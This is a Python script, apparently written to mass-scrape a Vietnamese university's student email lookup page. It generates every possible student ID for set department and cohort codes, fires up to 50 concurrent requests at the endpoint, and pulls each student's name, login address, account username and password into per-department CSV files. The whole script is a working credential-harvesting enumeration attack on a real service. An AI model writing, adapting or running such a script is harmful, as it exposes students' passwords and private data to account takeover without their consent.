import aiohttp
import asyncio
import time
import csv
import re
import os
from bs4 import BeautifulSoup
from tqdm import tqdm

URL = "https://tracuuthongtin.ftu.edu.vn/03_select_tracuuemail_k59.php"
SEMAPHORE = asyncio.Semaphore(50)

# Danh sách ngành và mã ngành
departments = {
    "Kế toán": ["810", "820"],
    "Kinh doanh quốc tế": ["510", "520", "530", "550"],
    "Kinh tế": ["110", "120", "140", "150"],
    "Kinh tế quốc tế": ["410", "420", "450"],
    "Luật": ["610"],
    "Ngôn ngữ Anh": ["710"],
    "Ngôn ngữ Nhật": ["740", "750"],
    "Ngôn ngữ Pháp": ["730", "760"],
    "Ngôn ngữ Trung": ["720", "770"],
    "Quản trị khách sạn": ["920"],
    "Quản trị kinh doanh": ["210", "250", "280"],
    "Tài chính ngân hàng": ["310", "320", "330", "340", "380"],
}
# CD_VALUES = ["00", "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20"]
# CD_VALUES = ["09", "10", "11", "12", "13", "14", "15", "16", "17", "18"]
CD_VALUES = ["00", "01", "02", "03", "04", "05", "06", "07", "08", "19", "20"]

RESULT_DIR = "loc_ten_nganh_remainder/k59"
os.makedirs(RESULT_DIR, exist_ok=True)

#Sua: K59 = 20, K58 = 19, K57 = 18, K56 = 17
def generate_msv_list(year_values):
    return [
        f"20{cd}{year}{str(i).zfill(3)}"
        for cd in CD_VALUES
        for year in year_values
        for i in range(1000)
    ]

def extract_info(msv, soup):
    text = soup.get_text(" ", strip=True)
    data = {
        "Mã sinh viên tra cứu": msv,
        "Mã sinh viên": None,
        "Họ và Tên": None,
        "Khóa": None,
        "Truy cập địa chỉ": None,
        "Tài khoản truy cập": None,
        "Mật khẩu": None
    }

    patterns = {
        "Mã sinh viên": r"Mã sinh viên:\s*(\d+)",
        "Họ và Tên": r"Họ và Tên:\s*([\w\sÀ-Ỹà-ỹ]+)",
        "Khóa": r"Khóa:\s*(K\d+)",
        "Truy cập địa chỉ": r"Truy cập địa chỉ:\s*(http[^\s]+)",
        "Tài khoản truy cập": r"Tài khoản truy cập:\s*([\w.@]+)",
        "Mật khẩu": r"Mật khẩu:\s*(\d+)"
    }

    for key, pattern in patterns.items():
        match = re.search(pattern, text)
        if match:
            data[key] = match.group(1)

    return list(data.values())

async def fetch_data(session, msv, errors):
    async with SEMAPHORE:
        try:
            async with session.post(URL, data={"msv": msv}, timeout=5) as response:
                if response.status == 200:
                    text = await response.text()
                    soup = BeautifulSoup(text, "html.parser")
                    if "KHÔNG TÌM THẤY THÔNG TIN TRA CỨU" in soup.get_text():
                        return None
                    return extract_info(msv, soup)
                else:
                    errors.append(msv)
        except Exception:
            errors.append(msv)
        return None

async def process_data(year_values, result_file, error_file):
    errors = []
    msv_list = generate_msv_list(year_values)
    start_time = time.time()

    async with aiohttp.ClientSession() as session:
        tasks = [fetch_data(session, msv, errors) for msv in msv_list]
        results = []
        with tqdm(total=len(tasks), desc=f"Fetching Data for {result_file}") as pbar:
            for future in asyncio.as_completed(tasks):
                result = await future
                if result:
                    results.append(result)
                pbar.update(1)

    with open(result_file, "w", encoding="utf-8", newline="") as f:
        writer = csv.writer(f, delimiter=';')
        writer.writerow(["Mã sinh viên tra cứu", "Mã sinh viên", "Họ và Tên", "Khóa", "Truy cập địa chỉ", "Tài khoản truy cập", "Mật khẩu"])
        for data in results:
            writer.writerow(data)

    if errors:
        with open(error_file, "w", encoding="utf-8", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["Mã sinh viên lỗi"])
            for err in errors:
                writer.writerow([err])
        print(f"⚠️ Đã lưu {len(errors)} lỗi vào {error_file}")

    end_time = time.time()
    print(f"✅ Hoàn thành {result_file}! Thời gian: {end_time - start_time:.2f}s")

async def main():
    tasks = []
    for department, years in departments.items():
        result_file = os.path.join(RESULT_DIR, f"DataFtu_k59_remainder_{department.replace(' ', '_')}.csv")
        error_file = os.path.join(RESULT_DIR, f"errors_remainder_{department.replace(' ', '_')}.csv")
        tasks.append(process_data(years, result_file, error_file))
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
